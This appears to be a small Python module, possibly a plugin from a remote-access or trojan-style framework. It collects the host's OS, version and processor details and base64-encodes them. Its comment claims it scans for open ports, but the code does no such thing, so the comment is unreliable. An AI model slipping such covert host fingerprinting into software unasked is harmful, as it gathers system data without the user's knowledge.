# scan for open ports and return the result
import platform,socket,re,uuid, psutil, base64

def run(**args):
    info = platform.system()
    info += platform.release()
    info += platform.version()
    info += platform.machine()
    info += platform.processor()
    

    # encode info to base64 
    b = bytes(str(info), encoding='utf-8')
    encoded_string = base64.b64encode(b)
    return encoded_string
   